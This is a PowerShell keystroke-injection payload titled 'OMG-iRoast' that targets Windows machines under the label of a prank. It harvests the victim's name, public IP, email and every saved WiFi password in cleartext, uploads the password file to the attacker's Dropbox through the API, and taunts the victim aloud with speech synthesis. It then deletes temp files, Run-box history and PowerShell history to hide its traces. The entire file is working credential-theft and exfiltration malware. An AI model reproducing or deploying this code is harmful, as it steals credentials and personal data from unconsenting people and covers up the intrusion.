############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : OMG-iRoast        | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Prank/Recon       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
# Dependencies : DropBox           |  My Crime is That of Curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |                                                           ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |                                                          (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  https://www.instagram.com/i_am_jakoby                                                                     #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#                                                                                                            #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
###########################################################################################################################################################

<#

.DESCRIPTION 
	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
	The SSID and WiFi password of any current or previously connected to networks.
	It determines the last day they changed thier password and how many days ago.
	Then uses Sapi speak to roast their set up and lack of security
	Additionally you have the option to upload their info to your DropBox Cloud storage.

.LINK 
	This is the link you go to after signing into your DropBox account to make an App for uploading files to the DropBox Cloud Storage
	https://www.dropbox.com/developers/apps

	This link is the guide for how you get your DropBox Access Token for uploading files to your cloud storage
	https://developers.dropbox.com/oauth-guide

#>
############################################################################################################################################################

# Variables

$DropBoxAccessToken = ""


############################################################################################################################################################
# Intro ---------------------------------------------------------------------------------------------------
 function Get-Intro {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    $NameArray =$fullName.Split(" ")

    #$firstName = $NameArray[0]

    #$lastName = $NameArray[1]

    }
 
 # If no name is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return " $fullName , it has been a long time my friend  "

}

# echo statement used to track progress while debugging
echo "Intro Done"

###########################################################################################################

<#

.NOTES 
	Basic Info
	This will get basic spec information on the target computer such a Operating System and RAM
#>


function Get-BasicInfo {

    try {

    $OS = (Get-WmiObject Win32_OperatingSystem).Name;$OSpos = $OS.IndexOf("|");$OS = $OS.Substring(0, $OSpos)

    $RAM=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1}" -f ($_.sum / 1GB)}
    $RAMpos = $RAM.IndexOf('.')
    $RAM = [int]$RAM.Substring(0,$RAMpos).Trim()

# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $lowRAM = "$RAM gigs of ram? thats pretty low"
    
    $okRAM = "$RAM gigs of ram really? I have a calculator with more computing power"
    
    $goodRAM = "$RAM gigs of ram? That is not terrible I guess"

    $impressiveRAM = "$RAM gigs of ram? are you serious? a super computer with no security that is funny right there"
#----------------------------------------------------------------------------------------------------

    if($RAM -le 4){
       return $lowRAM
    } elseif($RAM -ge 5 -and $RAM -le 12){
       return $okRAM
    } elseif($RAM -ge 13 -and $RAM -le 24){
       return $goodRAM
    } else {
       return $impressiveRAM
    }

    }
 
 # If one of the above parameters is not detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Error in search" 
    return $null
    -ErrorAction SilentlyContinue
    }
}

# echo statement used to track progress while debugging
echo "Basic Info Done"

###########################################################################################################

<#

.NOTES 
	Public IP 
	This will get the public IP from the target computer
#>


function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
 # If no Public IP is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return "your public  I P address is $computerPubIP"
}

# echo statement used to track progress while debugging
echo "Pub IP Done"

###########################################################################################################

<#

.NOTES 
	Wifi Network and Password
	This function will custom a tailor response based on how many characters long their password is
#>


function Get-Pass {

    #-----VARIABLES-----#
    # $pwl = their Pass Word Length
    # $pass = their Password 

    try {

    $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
    $pos = $pro.IndexOf(':')
    $pro = $pro.Substring($pos+2).Trim()

    $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
    $passPOS = $pass.IndexOf(':')
    $pass = $pass.Substring($passPOS+2).Trim()
    
    if($pro -like '*_5GHz*') {
      $pro = $pro.Trimend('_5GHz')
    } 

    $pwl = $pass.length


    }
 
 # If no network is detected function will return $null to avoid sapi speak
 
    # Write Error is just for troubleshooting
    catch {Write-Error "No network was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }


# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $badPASS = "$pro is not a very creative name but at least it is not as bad as your wifi password... only $pwl characters long? $pass ...? really..? $pass was the best you could come up with?"
    
    $okPASS = "$pro is not a very creative name but at least you are trying a little bit, your password is $pwl characters long, still trash though.. $pass ...? You can do better"
    
    $goodPASS = "$pro is not a very creative name but At least you are not a total fool... $pwl character long password actually is not bad, but it did not save you from me did it? no..it..did..not! $pass is a decent password though."
#----------------------------------------------------------------------------------------------------

    if($pass.length -lt 8) { return $badPASS

    }elseif($pass.length -gt 7 -and $pass.length -lt 12)  { return $okPASS

    }else { return $goodPASS

    }
}

# echo statement used to track progress while debugging
echo "Wifi pass Done"

###########################################################################################################

<#

.NOTES 
	All Wifi Networks and Passwords 
	This function will gather all current Networks and Passwords saved on the target computer
	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
#>


# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){

    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}
    if (!$WLANProfileObjects) { Write-Host "variable is null" 
    }else { 

	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage

	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"

	"W-Lan profiles: 
	=================================================================="+ ($WLANProfileObjects| Out-String) >> $Env:temp\$FileName


# This is a function that will open up notepad with all their saved networks and passwords and taunt them

	function Get-All_Pwds {
    		$s.Speak("wanna see something really cool?")
    		notepad $Env:temp\$FileName
    		$s.Speak("Look at all your other passswords I got..")
    		Start-Sleep -Seconds 1
    		$s.Speak("These are the wifi passwords for every network you've ever connected to!")
    		Start-Sleep -Seconds 1
    		$s.Speak("I could send them to myself but i wont")
    		#taskkill /im notepad.exe /f
    	}


# echo statement used to track progress while debugging
echo "All Wifi Passes Done"

###########################################################################################################

<#

.NOTES 
	Upload txt file containing Network names and Passwords to dropbox

	this is the link you go to after signing into your DropBox account to make an App for uploading files to
	https://www.dropbox.com/developers/apps

	this link is the guide for how you get your DropBox Access Token for uploading files to your cloud storage
	https://developers.dropbox.com/oauth-guide
#>



#----------------------------------------------------------------------------------------------------------


	$TargetFilePath="/$FileName"
	$SourceFilePath="$env:TMP\$FileName"
	$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
	$authorization = "Bearer " + $DropBoxAccessToken
	$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
	$headers.Add("Authorization", $authorization)
	$headers.Add("Dropbox-API-Arg", $arg)
	$headers.Add("Content-Type", 'application/octet-stream')
	Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

    }
###########################################################################################################

<#

.NOTES 
	Password last Set
	This function will custom tailor a response based on how long it has been since they last changed their password
#>


 function Get-Days_Set {

    #-----VARIABLES-----#
    # $pls (password last set) = the date/time their password was last changed 
    # $days = the number of days since their password was last changed 

    try {
 
    $pls = net user micha | Select-String -Pattern "Password last" ; $pls = [string]$pls
    $plsPOS = $pls.IndexOf("e")
    $pls = $pls.Substring($plsPOS+2).Trim()
    $pls = $pls -replace ".{3}$"
    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
    $DateArray =$time.Split(".")
    $days = [int]$DateArray[0]
    }
 
 # If no password set date is detected funtion will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Day password set not found" 
    return $null
    -ErrorAction SilentlyContinue
    }


# ENTER YOUR CUSTOM RESPONSES HERE 
#---------------------------------------------------------------------------------------------------- 
    $newPass = "$pls was the last time you changed your password... You changed your password $days days ago..   I have to applaud you.. at least you change your password often. Still did not stop me! "
    
    $avgPASS = "$pls was the last time you changed your password... it has been $days days since you changed your password, really starting to push it, i mean look i am here. that tells you something " 
    
    $oldPASS = "$pls was the last time you changed your password... it has been $days days since you changed your password, you were basically begging me to hack you, well here i am! "
#----------------------------------------------------------------------------------------------------      
    
    if($days -lt 45) { return $newPass

    }elseif($days -gt 44 -and $days -lt 182)  { return $avgPASS

    }else { return $oldPASS

    }
}

# echo statement used to track progress while debugging
echo "Pass last set Done"

###########################################################################################################

<#

.NOTES 
	Get Email
	This function will custom tailor a response based on what type of email the target has
#>

function Get-email {
    
    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
    
    $emailpos = $email.IndexOf("@")
    
    $domain = $email.Substring($emailpos+1) #.TrimEnd(".com")

    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "you're lucky you do not have your email connected to your account, I would have really had some fun with you then lol"
    -ErrorAction SilentlyContinue
    }
        
# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $gmailResponse = "we should be friends. If you are down just email me back, ill message you at $email. That is your email right?"
    $yahooResponse = "really?. you have a yahoo account"
    $hotmailResponse = "really?. you have a yahoo account"
    $otherEmailResponse = "this is a test"
#----------------------------------------------------------------------------------------------------

    if($email -like '*gmail*') { return $gmailResponse

    }elseif($email -like '*yahoo*')  { return $yahooResponse

    }elseif($email -like '*hotmail*')  { return $hotmailResponse
    
    }else { return $otherEmailResponse}


}

# echo statement used to track progress while debugging
echo "Email Done"

###########################################################################################################

<#

.NOTES 
	Messages
	This function will run all the previous functions and assign their outputs to variables
#>

$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

$intro = "$fullName , it has been a long time my friend"

$BASICwarn = Get-BasicInfo  

$PUB_IPwarn = Get-PubIP  

$PASSwarn = Get-Pass

$LAST_PASSwarn =  Get-Days_Set

$EMAILwarn = Get-email 

$OUTRO =  "Laterrrr $fullName ..... p  s  i left my contact details on your desktop."

# echo statement used to track progress while debugging
echo "Speak Variables set"

###########################################################################################################

# This turns the volume up to max level--------------------------------------------------------------------

#$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# echo statement used to track progress while debugging
echo "Volume to max level"

###########################################################################################################

<#

.NOTES 
	This will display a pop up window for however many seconds you put to indicate the script is ready
	Or this makes the CapsLock indicator light blink however many times you set it to
	if you do not want the ready notice to pop up or the CapsLock light to blink comment them out below
#>

#----------------------------------------------------------------------------------------------------------

$popUpTime = 3
$readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup("The script is ready and loaded", $popUpTime)

$blinks = 6
$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $blinks*2; $num++){$o.SendKeys("{CAPSLOCK}");Start-Sleep -Milliseconds $ms}
#-----------------------------------------------------------------------------------------------------------

<#

.NOTES 
	Then the script will be paused until the mouse is moved 
	script will check mouse position every indicated number of seconds
	This while loop will constantly check if the mouse has been moved 
	"CAPSLOCK" will be continously pressed to prevent screen from turning off
	it will then sleep for the indicated number of seconds and check again
	when mouse is moved it will break out of the loop and continue script
#>


Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }

###########################################################################################################

# this is where your message is spoken line by line

$s=New-Object -ComObject SAPI.SpVoice

# This sets how fast Sapi Speaks

$s.Rate = -1

$s.Speak($intro)

#$s.Speak($BASICwarn)

#$s.Speak($PUB_IPwarn)

#$s.Speak($PASSwarn)

Get-All_Pwds

#$s.Speak($LAST_PASSwarn)

#$s.Speak($EMAILwarn)

#$s.Speak($OUTRO)

###########################################################################################################

# this snippet will leave a message on your targets desktop 

$message = "with love, `n-jakoby"
Add-Content $home\Desktop\HackerContact.txt $message
###########################################################################################################

# Download Sound (When using your own link "dl=0" needs to be changed to "dl=1")
#iwr https://www.dropbox.com/s/l0xm9mw8ecvi8bv/NGGYU.wav?dl=1 -O $env:TMP\f.wav

# Play Sound 
#$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\f.wav";$PlayWav.playsync()
###########################################################################################################

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

###########################################################################################################

###########################################################################################################
